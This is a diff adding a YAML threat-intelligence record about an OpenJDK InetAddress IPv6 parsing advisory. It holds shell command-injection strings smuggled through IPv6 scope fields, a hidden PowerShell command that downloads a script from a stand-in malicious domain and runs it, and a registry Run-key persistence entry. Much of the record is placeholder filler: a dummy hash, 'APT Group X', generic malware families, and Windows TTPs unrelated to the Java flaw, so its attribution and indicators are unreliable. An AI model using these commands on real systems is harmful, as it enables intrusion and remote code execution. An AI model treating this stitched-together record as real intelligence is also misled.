@@ -1,0 +1,82 @@
+description: The private static InetAddress::getAllByName(String,InetAddress) method
+  is used internally and by the public static InetAddress::getAllByName(String) to
+  resolve host or IP strings to IP addresses. It does not properly validate the format
+  of a given IP address string, allowing arbitrary characters within IPv6 address
+  strings.
+TTPs:
+  processes:
+  - /bin/sh
+  - notepad.exe
+  - powershell.exe
+  - cmd.exe
+  commandline:
+  - /bin/sh -c ping -c 1 "::1%1]foo.bar baz'; id>/tmp/id2; exit '42"
+  - /bin/sh -c ping -c 1 "::ffff:1.1.1.1%1]foo.bar baz'\"]
+  - /bin/sh -c ping -c 1 "::ffff:0101:0101%1]foo.bar baz'\"]
+  - /bin/sh -c ping -c 1 "::ffff:1.1.1.1%1foo.bar baz'\"]
+  - /bin/sh -c ping -c 1 "::ffff:0101:0101%1foo.bar baz'\"]
+  - powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri
+    http://maliciousdomain.com/script.ps1 -OutFile script.ps1"
+  - cmd.exe /c start notepad.exe
+  powershell: 'Invoke-WebRequest -Uri http://maliciousdomain.com/script.ps1 -OutFile
+    script.ps1
+
+    $script = Get-Content script.ps1; Invoke-Expression $script
+
+    '
+  scripting_engine:
+  - VBScript
+  - JScript
+  registry_keys:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousKey
+  image_load:
+  - notepad.exe -> malicious.dll
+  network_connections:
+  - process: /bin/sh
+    destination: ::1%1]foo.bar baz'; id>/tmp/id2; exit '42
+    port: ''
+  - process: /bin/sh
+    destination: ::ffff:1.1.1.1%1]foo.bar baz'\"]
+    port: ''
+  - process: /bin/sh
+    destination: ::ffff:0101:0101%1]foo.bar baz'\"]
+    port: ''
+  - process: /bin/sh
+    destination: ::ffff:1.1.1.1%1foo.bar baz'\"]
+    port: ''
+  - process: /bin/sh
+    destination: ::ffff:0101:0101%1foo.bar baz'\"]
+    port: ''
+  - powershell.exe -> http://maliciousdomain.com:80
+  - cmd.exe -> http://anothermaliciousdomain.com:443
+  file_activity:
+  - /tmp/id2
+  - C:\Users\user\Downloads\script.ps1
+  - C:\Windows\Temp\tempfile.txt
+  persistence:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousKey
+  pipes:
+  - \.\pipe\malicious_pipe
+  process_relations:
+  - powershell.exe -> cmd.exe
+IOCs:
+  hashes:
+  - SHA256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
+  IPs:
+  - 192.168.1.1
+  - 10.0.0.1
+  domains:
+  - maliciousdomain.com
+  - anothermaliciousdomain.com
+  URLs:
+  - http://maliciousdomain.com/script.ps1
+authors:
+- Jeff Dileo
+attribution:
+- APT Group X
+malware_families:
+- Ransomware Family A
+- Trojan Family B
+reference: https://www.nccgroup.com/research-blog/technical-advisory-openjdk-weak-parsing-logic-in-javanetinetaddress-and-related-classes/
+date_of_publication: October 06, 2022
+file_creation_date: July 30, 2025
